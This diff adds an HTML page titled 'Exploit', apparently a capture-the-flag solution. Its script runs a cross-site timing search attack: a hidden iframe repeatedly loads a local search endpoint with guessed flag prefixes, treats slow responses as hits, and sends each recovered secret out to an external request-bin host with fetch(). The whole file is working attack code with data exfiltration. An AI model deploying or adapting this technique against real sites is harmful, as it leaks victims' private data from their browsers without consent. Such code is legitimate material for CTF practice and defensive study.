@@ -1,1 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit</title>
+</head>
+<body>
 
+<iframe src="" id="iframe" style="display:none;"></iframe>
+
+<script>
+const request_Bin = "https://szcwari.request.dreamhack.games";
+
+async function exploit() {
+    let word_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
+    let flag = "scpCTF{";
+
+    while (!flag.endsWith("}")) {
+        for (let c of word_list) {
+            let query = flag + c;
+
+            if (await search(query)) {
+                flag += c;
+                fetch(`${request_Bin}/${flag}`);
+                break;
+            }
+        }
+    }
+}
+
+function search(query) {
+    return new Promise((resolve, reject) => {
+        let iframe = document.getElementById("iframe");
+        let starttime = performance.now();
+
+        iframe.src = `http://127.0.0.1:12002/search?query=${query}`;
+
+        iframe.onload = function() {
+            let endtime = performance.now();
+            let duration = endtime - starttime;
+
+            if (duration > 3000) {
+                resolve(true);
+            } else {
+                resolve(false);
+            }
+        };
+
+        iframe.onerror = function() {
+            resolve(false);
+        };
+    });
+}
+
+exploit();
+</script>
+</body>
+</html>
